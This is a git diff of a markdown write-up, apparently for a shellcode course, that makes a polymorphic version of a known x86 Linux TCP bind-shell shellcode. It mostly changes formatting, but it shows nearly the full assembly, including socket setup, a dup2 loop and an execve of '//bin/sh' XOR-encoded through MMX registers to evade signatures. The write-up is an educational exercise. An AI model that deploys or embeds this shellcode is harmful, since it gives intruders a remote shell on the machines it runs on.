@@ -33,8 +33,8 @@ The first shellcode I modified was `tcpbindshell (108 bytes)`, created by Russel
 + This shellcode can be found at `http://shell-storm.org/shellcode/files/shellcode-847.php`.  
 
 Our assignment required that our polymorphic version of the shellcode to not exceed 150% of the original value.   
-+ The original shellcode length is 108 bytes. 
-+ The final length of this polymorphic shellcode is 144 bytes.    
++ The original shellcode length is `108 bytes`. 
++ The final length of this polymorphic shellcode is `144 bytes`.    
 
 ## Polymorphic Shellcode
 + The code I added/modified is indented with one space.
@@ -57,7 +57,6 @@ push   0x2
 mov    ecx,esp
 int    0x80       ; System Call
  xchg esi,eax     ; Save the output of the syscal to the ESI register
-
  mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
  inc ebx          ; EBX = 0x2
 push   edx
@@ -69,7 +68,6 @@ push   ecx
 push   esi
 mov    ecx,esp
 int    0x80       ; System Call
-
  mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
  inc ebx
  inc ebx          ; EBX = 0x4
@@ -84,19 +82,16 @@ push   edx
 push   esi
 mov    ecx,esp
 int    0x80       ; System Call
-
 ; setup dup2 loop
 mov    ebx,eax
 xor    ecx,ecx
 mov    cl,0x3
-
 ; dup2
 dup2Loop:
 	dec ecx
 mov    al,0x3f
 int    0x80       ; System Call
 jne    dup2Loop
-
 push   edx
  mov edx, 0xffffffff     ; used to XOR the MM0 Register to result in "//bin/sh"
  mov eax, 0x978cd091     ; "n/sh" XOR'd with 0xffffffff
@@ -112,7 +107,6 @@ push   edx
  pxor mm0, mm1           ; XOR's mm0 with mm1 and saves the results in mm0
  sub esp, 8              ; Decrement the stack 8 bytes
  movq qword [esp], mm0   ; push "//bin/sh" from mm0 to the top of the stack
-
 xor    eax,eax
 mov    ebx,esp
 push   eax
@@ -122,7 +116,6 @@ push   eax
 mov    edx,esp
 mov    al,0xb
 int    0x80       ; System Call
-
 ```  
 
 + To push the filename string `//bin/sh` onto the stack, I used the MMX registers.   
